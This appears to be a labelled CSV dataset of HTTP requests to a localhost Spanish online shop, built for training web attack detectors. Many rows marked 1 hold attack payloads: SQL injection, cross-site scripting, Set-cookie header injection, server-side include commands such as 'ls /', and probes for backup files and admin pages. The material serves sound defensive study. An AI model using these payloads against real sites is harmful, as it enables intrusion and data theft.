query,label
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
modo=insertar&precio=5191&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ashrae&password=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&nombre=Yerald%ED&apellidos=Uca%F1ay&email=garet%40decsl.mg&dni=47175260Y&direccion=Calle+Adelardo+Covarsi+138+&ciudad=Santib%E1%F1ez+de+la+Pe%F1a&cp=08150&provincia=C%E1ceres&ntc=2464400659124948&B1=Registrar HTTP/1.1,1
modo=registro&login=swearing&password=feridad&nombre=Hilaria&apellidos=Palmieri+Layi&email=folsom_talli%40esteticadayda.tel&dni=60106679C&direccion=Calle+Dos+Reis+49+&ciudad=Toro&cp=34310&provincia=Granada&ntc=3362439041972349&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cavanaug&pwdA=aproximativo&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1,1
modo=registro&login=daesik2&password=24%ED58ca1e581&nombre=Panciano&apellidos=Masc%F3+Pr*.ado&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif/6909030637832563290.jsp HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
modo=insertar&precio=8466&B1=Confirmar,0
B2=Vaciar+carrito,0
idA=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=69&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif.Old HTTP/1.1,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
modo=registro&login=lazure&password=carapopela&nombre=Galatas&apellidos=Espelt+Bone&email=martens%40ajuntamentbarcelona2-0.tl&dni=66226006J&direccion=San+Luis%2C+117%2C+&ciudad=Ca%F1ada+del+Hoyo&cp=10940&provincia=Zamora&ntc=0639487553835350&B1=Registrar,0
modo=insertar&precio=4730&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/vaciar.jsp.Inc HTTP/1.1,1
modo=registro&login=lerch&password=5elas2omat%E12eo&nombre=Alcira&apellidos=Forn%F3s+Kohls&email=busch%40show.nom.naany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&dni=71246547E&direccion=Francisco+Ni%F1o%2C+100+&ciudad=Marazoleja&cp=19144&provincia=Valladolid&ntc=2373775613776198&B1=Registrar,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp.bak HTTP/1.1,1
http://localhost:8080.java HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
modo=entrar&login=andee&pwd=59bI8ARI7O&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%252B HTTP/1.1,1
modo=entrar&login=macchius&pwd=%2Fren%27dido&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1,1
modo=registro&login=gonzaga&password=ACoNtecIMIENTO&nombre=Redenta&apellidos=Libano+Parramon&email=vigran%40maletti.cy&dni=24320656L&direccion=Calle+Tagarnina%2C+120%2C+13C&ciudad=Roca+del+Vall%E8s%2C+La&cp=10748&provincia=Castell%F3nany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ntc=6815796601581594&B1=Registrar,1
modo=registro&login=simonne&password=virgen&nombre=Fredesvinda&apellidos=Vilar+El%F3segui&email=myhers%40wave.com.so&dni=96804276J&direccion=Calle+Crehuet%2C+63+4-H&ciudad=Novallas&cp=05510&provincia=Salamanca&ntc=3261409543523754&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=9353&B1=Confirmar HTTP/1.1,1
http://localhost:8080/CFIDE/administrator/welcome.cfm HTTP/1.1,1
http://localhost:8080/IISSamples/sdk/asp/docs/ColorPicker.asp HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,1
id=3&nombre=Queso+Manchego&precio=39&cantidad=40&B1A=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
modo=entrar&login=mcdonald&pwd=8ib6a&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/scripts/tools/drvrs.exe HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
id=%257C,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=84&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=85&cantidad=86&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melisse&pwd=pleit%E9s&remember=on&B1A=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%2B HTTP/1.1,1
modo=registro&login=seymour5&password=014e35&nombre=Arroldo&apellidos=Kagioglu+Almendro&email=vildo%40prensahp.fj&dni=46225556H&direccion=Pla%E7a+Font%2C+179+&ciudad=Caminreal&cp=19223&provincia=Huesca&ntc=1901048287713824&B1=Registrar,0
http://localhost:8080/asf-logo-wide.java HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1632&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sarna5&password=%21laureando&nombre=Alci.a&apellidos=Calera+Hera&email=allenbury-nantasiri%40audiosat.az&dni=02790010H&direccion=Calle+Castilleja+De+La+Cuesta+70%2C+&ciudad=T%EDrvia&cp=03638&provincia=Girona&ntc=1446048659469569&B1=Registrar HTTP/1.1,1
modo=insertar&precio=3625&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7549&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+ HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
modo=entrar&login=sabety&pwd=desfacedora&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5083&B1=Confirmar HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
id=3&nombreA=Vino+Rioja&precio=100&cantidad=41&B1=A%F1adir+al+carrito,1
id=2,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
modo=entrar&login=cadtools&pwd=hirco&remember=on%2F&B1=Entrar,1
modo=registro&login=zug&password=alternaci-59&nombre=Manel&apellidos=Llimes&email=partridge%40tamarit.com.gs&dni=23404560J&direccion=Camino+Uba%2C+121%2C+&ciudad=Art%E9s&cp=06892&provinciaA=Toledo&ntc=5728967696273314&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=48&B1=A%F1adir+al+carrito,0
modo=registro&login=radick&password=aleve&nombre=Par%EDs&apellidos=Roth*ermel+San+Segundo&email=cawdon%40programaciones.com.gg&dni=41955080K&direccion=C%2F+San+Jose+121%2C+11%3FD&ciudad=Holguera&cp=43894&provincia=Granada&ntc=8674124405846467&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elefther&password=a_ma6ar&nombre=Dacil&apellidos=Bon%EDas+Aleza&email=mallalie%40u%40logiteclin%40es.%40ly&dni=41273299Y&direccion=Lucas+Mallada%2C+28%2C+&ciudad=Cantalpino&cp=34469&provincia=Guip%FAzcoa&ntc=7363123052285144&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=69&B1=A%F1adir+al+carrito HTTP/1.1,0
modo=registro&login=kriz&password=fusado&nombre=Mae&apellidos=Arxe+Matsumiya&email=bergere%40canovash.bb&dni=04711214D&direccion=Calle+Manco%2C+109%2C+10-G&ciudad=Sant+Llu%EDs&cp=33825&provincia=Tarragona&ntc=7010348636170522&B1=Registrar,0
modo=registro&login=lula&password=indIVIduo&nombre=Iracen&apellidos=Frau+Puigveh%ED&email=murphy-ekstroem%40altoguadiana.ao&dni=61128609Z&direccion=Calle+Matula%2C+S%2FN%2C+&ciudad=Cor%E7%E0&cp=42210&provincia=Burgos&ntc=7915699195068000&B1=Registrar,0
modo=insertar&precio=9849&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes.old HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cotner&password=amontona%2Br&nombre=Gervasio&apellidos=Moharra+Jodra&email=shiner-rangda%40guerrerodelbienestar.cr&dni=54368029P&direccion=C%2F+Pedro+Ortiz%2C+128+&ciudad=San+Cibrao+das+Vi%F1as&cp=50332&provincia=Burgos&ntc=8731298131217571&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=52&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=natver&password=apoderado&nombre=Bienvenido&apellidos=Tonche+Mej%EDa&email=yepes%40enla.mg&dni=57955652E&direccion=C%2F+Montealegre+S%2FN%2C+9-B&ciudad=Realejos%2C+Los&cp=19192&provincia=%C1vila&ntc=1193655475933803&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
modo=registro&login=kelessog&password=131o1ho&nombre=Servio&apellidos=Isoba&email=delubac%40onoratoinformatica.ax&dni=59608339K&direccion=Calle+Finlandia%2C+S%2FN+&ciudad=Mengabril&cp=1662A&provincia=Granada&ntc=0133515893356936&B1=Registrar,1
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=von_ende6&password=2er9rqu5a&nombre=Helda&apellidos=Nebot+Curell&emailA=vadis%40clubdegolf.com.gf&dni=05120273J&direccion=C%2F+Guardia+Civil+181+10%3FE&ciudad=Albal%E1&cp=42107&provincia=Guadalajara&ntc=6734713412721708&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
modo=insertar&precio=8970&B1=Confirmar%2F,1
modo=insertar&precio=8083&B1A=Confirmar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vincente&password=ajoarriero&nombre=Matius&apellidos=Donohue+Colom&email=dobson7%40inversioneolica.sz&dni=66726372Z&direccion=Fernan+Caballero%2C+13+6F&ciudad=Sanl%FAcar+de+Guadiana&cp=14857&provincia=Tol*edo&ntc=2276944553574082&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lemmie&pwdA=InteMPesTI%2Bvo&remember=on&B1=Entrar HTTP/1.1,1
modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Iriarte+Porres&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudad=%3F&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar,1
modo=entrar&login=ettridge&pwd=guaranga&remember=on%2F&B1=Entrar,1
modo=entrar&login=rocio4&pwd=deSm%27Elar&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/asf-logo-wide.gif HTTP/1.1,1
modo=registro&login=torok&password=03f3so&nombre=Noel+Stefani&apellidos=Vilaseca+Regalado&email=howell%40zarasalud.mw&dni=17400980P&direccion=C%2F+San+Andres+79%2C+7%3FA&ciudad=Fontiveros&cp=49254&provinciaA=Guadalajara&ntc=4507218709160906&B1=Registrar,1
http://localhost:8080/tienda1~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mcgee&password=ab*rIGaDERo&nombre=Salom%F3n&apellidos=Castany+Bigorra&email=karapiet%40novaservicios.gr&dni=A3929256W&direccion=Mantua+35%2C+&ciudad=Instinci%F3n&cp=28512&provincia=Navarra&ntc=1541713650880969&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/6909030637832563290.jsp.Bak HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp.OLD HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
id=1,0
id=3&nombre=Vino+Rioja&precio=39&cantidad=4&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,1
B2=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=defalco&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Suyai&apellidos=R%E1bago+Patraca&email=ghenaiem_berlin%40hipotecascom.je&dni=24778234N&direccion=C%2F+La+Salpa+104%2C+&ciudad=Moral+de+la+Reina&cp=10334&provincia=Burgos&ntc=5823821605242067&B1=Registrar HTTP/1.1,1
id=2,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
modo=entrar&loginA=nevin&pwd=DEsGRADuAR&remember=on&B1=Entrar,1
errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%2500&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jenn&password=afrancESamienTo&nombre=Ada%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Matar%F3+I%F1iguez&email=newfield.watase%40cortinasartesol.yu&dni=75678701F&direccion=Calle+Sol+188+9-H&ciudad=Santo+Domingo+de+la+Calzada&cp=45179&provincia=Albacete&ntc=9167215819238112&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2B HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27OR%27a%3D%27a HTTP/1.1,1
modo=insertar&precio=7233any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Confirmar,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/.java HTTP/1.1,1
modo=insertar&precio=6071&B1=Confirmar%2F,1
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/IBMWebAS HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=deying&pwd=serpe4tinamente&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a%257C&ntc=1457291251258810&B1=Registrar HTTP/1.1,1
id=1&nombre=Queso+Manchego&precio=39&cantidad=61&B1=A%F1adir+al+carrito,0
errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
modo=registro&login=coraline&password=co1coja&nombre=Estasio&apellidos=Cl%E9rici+Panella&email=boskova_busey%40piensoparaperros.qa&dni=12205405H&direccion=C%2F+Boabdil%2C+91+&ciudad=Lubi%E1n&cp=23670&provincia=Salamanca&ntc=5830397031097456&B1=Registrar,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
modo=insertar&precio=6965&B1=Pasar+por+caja,0
B2=Vaciar+carrito,0
modo=entrar&login=tammy5&pwd=forzam%27ie%2Fn%2Fto&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/servlet/aphtpassword HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
modo=registro&login=jiuhuai4&password=renombrada&nombre=Vasty&apellidos=Aceituno+Masdevall&email=ronoro_dalya%40foreignoffice.nu&dni=48258022C&direccion=Via+Apicola+45%2C+4%3FC&ciudad=Santa+Mar%EDa+de+Sando%4040&cp=47182&provincia=Salamanca&ntc=9198580449925150&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=akio&password=peng1in&nombre=Berenice&apellidos=Segu%ED+San+Marful&email=knight_freihart%40tresbrujas.qa&dni=01246496B&direccion=Azorin%2C+167+&ciudad=Cuevas+Labradas&cp=42180&provincia=Burgos&ntc=0330245164005176&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=20&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/scripts/tools/drvrs.exe HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27+AND+%271%27%3D%271&login=ranbir&pwd=sal%EDfero&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=4831&B1=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp/ HTTP/1.1,1
errorMsg=Credenciales+incorrectasparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
idA=2,1
errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=80&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=niccolo&pwd=astrac%E1n&rememberA=on&B1=Entrar HTTP/1.1,1
errorMsg=%2B,1
modo=registro&login=flint&password=heRBecER&nombre=Nabil&apellidos=Salleras+Lima&email=volmut8%40santcugatpisos.ca&dni=51483838V&direccionA=Calle+Isla+Columbretes+111+&ciudad=Soto+de+Cerrato&cp=47120&provincia=Valencia&ntc=2744245058125133&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%27c*line&password=FAVo6ECeDorA&nombre=Par%EDs&apellidos=Corral+Rahal&email=healy%40ajedrezconmaestros.ch&dni=15756299B&direccion=Carrer+Verge+De+L%27alba%2C+S%2FN+&ciudad=San+Morales&cp=15338&provincia=Le%F3n&ntc=8682803216185712&B1=Registrar HTTP/1.1,1
id=1%2F&nombre=Queso+Manchego&precio=85&cantidad=49&B1=A%F1adir+al+carrito,1
modo=registro&login=cecelia&password=terciopelado&nombre=Federica&apellidos=Heusser+Talo&email=sofaer%40multasdetransito.cu&dni=67293578V&direccion=Plza.+Irantzuko+Monasterioaren+63%2C+&ciudad=Purullena&cp=41111&provinciaA=Lleida&ntc=7562944888996473&B1=Registrar,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
id=1&nombre=Queso+Manchego&precio=100&cantidad=59&B1=A%F1adir+al+carrito,0
modo=registro&login=anderton&password=pas63a0a&nombre=Nav%EDa&apellidos=Blancafort&email=pindi%40cortinasartesol.tm&dni=81012741W&direccion=Camino+Torrecilla%2C+42%2C+&ciudad=Luena&cp=41100&provincia=Toledo&ntc=5388507530059847&B1=Registrar,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/4861362529278789730~ HTTP/1.1,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=67&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.BAK HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=arco&password=b74RerA&nombre=Agueda&apellidos=Sauri+Sanaspleda&email=gozzi%40encuentrodominios.at&dni=57154114B&direccion=Calle+Medellin+188%2C+3E&ciudad=A%F1ana&cp=26360&provincia=C%E1ceres&ntc=6165671894107883&B1=Registrar HTTP/1.1,1
modo=registro&login=mckee&password=A98A60Az90&nombre=Elivio&apellidos=Martell+Canasa&email=blomfield%40enlanzarote.com.al&dni=78360619X&direccion=Carretera+De+Ribadesella+a+Canero+68+10-G&ciudad=Villavaquer%EDn&cp=10739&provincia=Soria&ntc=8323552403219603&B1=Registrar,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=swen&pwdA=incisorio&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ne-regio&pwd=sabio&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frants&pwd=clor%2F%EDTIca&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/index.jsp.INC HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
id=1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=froud&pwd=co8cub3na&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,1
http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tranfagl&password=23l8noi7e&nombre=Veneranda&apellidos=B%E1ez+Clua&email=gretler-rinell%40magadan.com.yu&dni=38888523P&direccion=Lugar+Grela+152+1%3FF&ciudad=Terrateig&cp=19185&provincia=Albacete&ntc=0269447503610316&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
modo=entrar&loginA=bredfeld0&pwd=malhumo2ada&remember=on&B1=Entrar,1
